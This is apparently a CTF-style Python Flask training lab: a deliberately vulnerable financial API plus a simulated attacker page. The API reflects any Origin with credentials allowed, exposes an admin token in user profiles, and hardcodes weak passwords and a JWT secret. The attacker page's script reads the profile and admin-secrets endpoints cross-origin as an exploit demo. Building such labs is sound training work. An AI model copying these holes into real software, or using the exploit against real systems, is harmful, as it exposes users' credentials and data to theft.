#!/usr/bin/env python3
"""
FinanceAPI - Financial Data REST API
=====================================
A deliberately vulnerable Flask application for cybersecurity training.

Vulnerabilities:
  1. CORS Origin reflection - reflects any Origin header (CWE-942)
  2. Access-Control-Allow-Credentials: true with wildcard-like CORS
  3. Admin token exposed in profile, stealable via CORS
"""

import os
import datetime
import hashlib
import threading

from flask import Flask, request, jsonify, Response, make_response
import jwt

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

JWT_SECRET = "financeapi-jwt-2024"
JWT_ALGORITHM = "HS256"
ADMIN_API_TOKEN = "fin-admin-tk-9a8b7c6d5e4f3a2b1c0d"

# ---------------------------------------------------------------------------
# In-memory user store
# ---------------------------------------------------------------------------

users = {}


def _hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()


def _read_flag(path):
    try:
        with open(path, "r") as f:
            return f.read().strip()
    except Exception:
        return "FLAG_FILE_NOT_FOUND"


def _seed_users():
    users["admin"] = {
        "username": "admin",
        "password": _hash_password("admin123"),
        "role": "admin",
        "email": "admin@financeapi.internal",
        "api_token": ADMIN_API_TOKEN,
    }
    users["analyst"] = {
        "username": "analyst",
        "password": _hash_password("analyst2024"),
        "role": "analyst",
        "email": "analyst@financeapi.internal",
        "api_token": "fin-analyst-tk-1a2b3c4d5e6f",
    }


_seed_users()

# ---------------------------------------------------------------------------
# JWT helpers
# ---------------------------------------------------------------------------


def _create_token(username, role):
    payload = {
        "username": username,
        "role": role,
        "iat": datetime.datetime.utcnow(),
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)


def _decode_token(token):
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
    except (jwt.ExpiredSignatureError, jwt.InvalidTokenError):
        return None


def _get_current_user():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return None
    return _decode_token(auth[7:])


# ===================================================================
# API SERVER (port 3000) - with broken CORS
# ===================================================================

api = Flask("api")


@api.after_request
def add_cors_headers(response):
    """
    VULNERABILITY: Reflects the Origin header in Access-Control-Allow-Origin
    without any validation. Combined with Allow-Credentials: true, this allows
    any website to make authenticated cross-origin requests.
    """
    origin = request.headers.get("Origin", "")
    if origin:
        response.headers["Access-Control-Allow-Origin"] = origin
    else:
        response.headers["Access-Control-Allow-Origin"] = "*"

    response.headers["Access-Control-Allow-Credentials"] = "true"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-API-Token"
    return response


@api.route("/")
def api_index():
    return jsonify({
        "application": "FinanceAPI",
        "version": "4.2.0",
        "message": "Financial data API. See /api/docs for endpoints."
    })


@api.route("/api/docs", methods=["GET"])
def api_docs():
    recon_flag = _read_flag("/var/www/.config/recon_flag.txt")

    endpoints = [
        {"method": "GET", "path": "/", "description": "API info", "auth": False},
        {"method": "GET", "path": "/api/docs", "description": "API documentation", "auth": False},
        {"method": "POST", "path": "/api/register", "description": "Register user", "auth": False},
        {"method": "POST", "path": "/api/login", "description": "Authenticate", "auth": False},
        {"method": "GET", "path": "/api/profile", "description": "User profile with API token", "auth": True},
        {"method": "GET", "path": "/api/market", "description": "Market data", "auth": True},
        {"method": "GET", "path": "/api/admin/secrets", "description": "Admin secrets", "auth": True,
         "note": "Requires admin role or admin API token"},
    ]
    return jsonify({
        "application": "FinanceAPI",
        "version": "4.2.0",
        "endpoints": endpoints,
        "cors_policy": "Configured for cross-origin access",
        "debug_token": recon_flag,
    })


@api.route("/api/register", methods=["POST"])
def register():
    data = request.get_json(silent=True)
    if not data or "username" not in data or "password" not in data:
        return jsonify({"error": "JSON body with 'username' and 'password' required"}), 400

    username = data["username"].strip()
    password = data["password"].strip()

    if username in users:
        return jsonify({"error": "Username already taken"}), 409

    import uuid
    users[username] = {
        "username": username,
        "password": _hash_password(password),
        "role": "user",
        "email": f"{username}@financeapi.internal",
        "api_token": f"fin-user-tk-{uuid.uuid4().hex[:12]}",
    }

    token = _create_token(username, "user")
    return jsonify({"message": "Registered successfully", "token": token}), 201


@api.route("/api/login", methods=["POST"])
def login():
    data = request.get_json(silent=True)
    if not data or "username" not in data or "password" not in data:
        return jsonify({"error": "JSON body with 'username' and 'password' required"}), 400

    username = data["username"].strip()
    password = data["password"].strip()

    user = users.get(username)
    if not user or user["password"] != _hash_password(password):
        return jsonify({"error": "Invalid credentials"}), 401

    token = _create_token(username, user["role"])
    return jsonify({"message": "Login successful", "token": token}), 200


@api.route("/api/profile", methods=["GET"])
def profile():
    payload = _get_current_user()
    if not payload:
        return jsonify({"error": "Authentication required"}), 401

    user = users.get(payload["username"])
    if not user:
        return jsonify({"error": "User not found"}), 404

    user_flag = _read_flag("/home/webapp/user.txt")

    return jsonify({
        "username": user["username"],
        "role": user["role"],
        "email": user["email"],
        "api_token": user["api_token"],
        "cors_note": f"CORS exploitation confirmed: {user_flag}",
    }), 200


@api.route("/api/market", methods=["GET"])
def market_data():
    payload = _get_current_user()
    if not payload:
        return jsonify({"error": "Authentication required"}), 401

    return jsonify({
        "market_data": [
            {"symbol": "AAPL", "price": 178.52, "change": 2.31},
            {"symbol": "GOOGL", "price": 141.80, "change": -0.95},
            {"symbol": "MSFT", "price": 374.58, "change": 1.47},
        ]
    }), 200


@api.route("/api/admin/secrets", methods=["GET"])
def admin_secrets():
    # Check JWT auth
    payload = _get_current_user()
    api_token = request.headers.get("X-API-Token", "")

    is_admin = False
    if payload and payload.get("role") == "admin":
        is_admin = True
    if api_token == ADMIN_API_TOKEN:
        is_admin = True

    if not is_admin:
        return jsonify({"error": "Admin access required"}), 403

    root_flag = _read_flag("/root/root.txt")

    return jsonify({
        "admin_secrets": {
            "database_url": "postgresql://finance:pr0d!p4ss@db.internal:5432/finance",
            "stripe_key": "FAKE_STRIPE_KEY_FOR_CTF_CHALLENGE",
            "master_flag": root_flag,
        }
    }), 200


@api.errorhandler(404)
def api_not_found(e):
    return jsonify({"error": "Endpoint not found"}), 404


# ===================================================================
# ATTACKER SIMULATION SITE (port 8080)
# ===================================================================

attacker = Flask("attacker")


@attacker.route("/")
def attacker_index():
    html = """<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit Demo</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
        h1 { color: #f00; }
        .output { background: #000; padding: 15px; border: 1px solid #333; margin: 10px 0;
                  white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
        button { background: #f00; color: #fff; border: none; padding: 10px 20px;
                 cursor: pointer; font-family: monospace; margin: 5px; }
        input { background: #333; color: #0f0; border: 1px solid #555; padding: 8px;
                font-family: monospace; width: 400px; }
    </style>
</head>
<body>
    <h1>[ATTACKER SITE] CORS Exploit Demonstration</h1>
    <p>This page simulates an attacker's website exploiting the FinanceAPI CORS misconfiguration.</p>

    <h3>Step 1: Enter victim's JWT token</h3>
    <input type="text" id="token" placeholder="Paste Bearer token here..." />

    <h3>Step 2: Steal data via CORS</h3>
    <button onclick="stealProfile()">Steal Profile Data</button>
    <button onclick="stealAdminSecrets()">Steal Admin Secrets</button>

    <h3>Stolen Data:</h3>
    <div class="output" id="output">Waiting for exploit...</div>

    <script>
        const API_BASE = 'http://localhost:3000';

        async function stealProfile() {
            const token = document.getElementById('token').value;
            const output = document.getElementById('output');
            try {
                const resp = await fetch(API_BASE + '/api/profile', {
                    headers: { 'Authorization': 'Bearer ' + token },
                    credentials: 'include'
                });
                const data = await resp.json();
                output.textContent = '[STOLEN] Profile data:\\n' + JSON.stringify(data, null, 2);
            } catch(e) {
                output.textContent = 'Error: ' + e.message;
            }
        }

        async function stealAdminSecrets() {
            const token = document.getElementById('token').value;
            const output = document.getElementById('output');
            try {
                const resp = await fetch(API_BASE + '/api/admin/secrets', {
                    headers: { 'Authorization': 'Bearer ' + token },
                    credentials: 'include'
                });
                const data = await resp.json();
                output.textContent = '[STOLEN] Admin secrets:\\n' + JSON.stringify(data, null, 2);
            } catch(e) {
                output.textContent = 'Error: ' + e.message;
            }
        }
    </script>
</body>
</html>"""
    return Response(html, mimetype="text/html")


# ---------------------------------------------------------------------------
# Startup
# ---------------------------------------------------------------------------

def run_api():
    api.run(host="0.0.0.0", port=3000, debug=False)


def run_attacker():
    attacker.run(host="0.0.0.0", port=8080, debug=False)


if __name__ == "__main__":
    print("=" * 60)
    print("  FinanceAPI v4.2.0 - Financial Data API")
    print("  API:           http://0.0.0.0:3000")
    print("  Attacker Site: http://0.0.0.0:8080")
    print("=" * 60)

    api_thread = threading.Thread(target=run_api, daemon=True)
    api_thread.start()

    run_attacker()
